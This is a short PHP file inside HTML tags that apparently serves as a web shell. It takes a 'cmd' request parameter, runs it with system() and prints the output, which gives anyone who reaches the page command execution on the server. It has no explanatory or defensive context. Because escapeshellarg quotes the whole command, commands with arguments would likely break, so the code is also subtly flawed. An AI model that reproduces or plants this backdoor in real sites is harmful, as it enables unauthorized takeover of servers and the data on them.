<html>
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $cmd = escapeshellarg($cmd);
        system($cmd);
        echo "</pre>";
        die;
}

?>
</html>

